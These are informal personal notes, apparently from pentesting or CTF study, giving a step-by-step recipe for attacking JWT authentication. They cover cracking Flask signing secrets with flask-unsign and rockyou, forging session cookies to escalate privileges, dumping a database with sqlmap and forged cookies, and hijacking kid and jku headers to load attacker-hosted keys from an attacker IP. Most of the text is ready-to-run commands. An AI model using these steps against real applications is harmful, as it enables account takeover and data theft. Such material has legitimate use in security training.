-to generate JWT token I can use jwt.io 

-to pass JWT token add  a request header

Authorization: Bearer <token>
                                         or
Cookie: auth= <token>

-if the application is written entirely in JavaScript e.g react then I need to add my token in the local storage

in order to change data carried by the JWT token:
if based upon the passphrase

in order to exploit it I need to get the passphrase(also called APP_SESSION_KEY) either by

finding somewhere around
cracking with hashcat
brute-forcing via flask-unsign (if application written in flask)




#to brute-force passphrase from the token:
Pip3 install flask-unsign
 
flask-unsign –wordlist rockyou.txt –unsign –cookie ‘<JWT_token>’ –no-literal-eval


Once i have the passphrase I can:
modify JWT token to escalate privileges

via JWT.io

              or via flask-unsign ( if application written in flask)

flask-unsign –sign –cookie ”<decoded_JWT_payload_you_want_modify>” –secret=’<passhparse>’


dump the database via flask-unsign (if application written in flask)

Pip3 install flask-unsign
Sqlmap <victim_ip> --eval=”from flask_unsign import session as s;session=s.sign({‘<parameter_found_decoded_JWT>’:session},secret=’<passphrase>’)” --cookie=”session=*" --dump

don’t merge cookie and don’t url encode cookie value in sqlmap


if based upon KID (key identifier) 
After decoding I will see in the header a connection to the server from where the key are retrieved 
original 
“kid”:”http://localhost/privKey.key”

In order to exploit it

copy the head of the JWT token

echo -n “ <head_JWT>” | base64 -d
change the original IP into your IP
echo -n ‘ <modified_head>’ | base64 -w0
put modified head in the token
 Launch the nc and if got the connection, it means it’s vulnerable

then
ssh-keygen -t <rsa> -b 4096 -m PEM -f privKey.key
(no passphrase)

Now we have a private key that we need to paste into the corresponding field

in order to get public key 
openssl <rsa> -in privKey.key -pubout -out pubKey.pub

Now you can change the data carried by JWT token and the signatures should be verified co you can replace the original token with the forged one 

python -m http.server   #to server your privKey.key



if based upon “jwks - JSON Web Key Sets” (needed to use e.g google account to authenticate to another application)
After decoding I will see JKU in the header 
 original:
“jku”:”http://<original_value>/jwks.json”

In order to exploit it:
copy the header part and tamper on your machine (you cannot do this in jwt.io because everything disappears when you try to change the value) into:
“jku”:’http://<unchanged_original_value>../redirect?url=<attacker_ip>:<port>/jwks.json

save it as jwt.header
base64 -w0 jwt.header > jwt.header.b64

replace the original header with the modified one 

Launch listener and if vulnerable you should get a connection

then

wget ’http://<original-value>>/jwks.json 
look at the fields

kty - this will tell you what encryption algorithm is used
n, e - modulus and exponent - those fields will be modified

ssh-keygen -t <encryption_algo> -b 4096 -m PEM -f jwt_modified.key
(no passphrase)

Now we need to get modulus and exponent out of it
To get exponent:

openssl <encrpytion_algo> -text -noout -in jwt_modified.key | grep publicExponent:

in the result copy the hex value (remember to remove the letter X)

echo -n <hex_value_witout_letter_X> | xxd -r -p | base64
and you got your new value for the field “e” in the jwks.json file

To get modulus:

openssl <encrpytion_algo> -text -noout -in jwt_modified.key -modulus

copy the result
echo -n <above_result> | xxd -r -p | base64 -w0

and you got your new value for the field “n” in the jwks.json file 
put this new value into “n” in your downloaded jwks.json

get back to the jwt.io

in the private RSA field paste your jwt_modified.key
for the public RSA field, execute the following:
openssl <encryption_algo> -in jwt_modified.key -pubout -out jwt_modified.key.pub

paste the results in the RSA public field

in the header change “jku” field into http://<original-value>../redirect?url=<attacker_ip>:<port>/jwks.json

Now you can modified data carried by JWT token
After that you got your forged token 
Launch the listener and replace the original JWT token with a forged one 

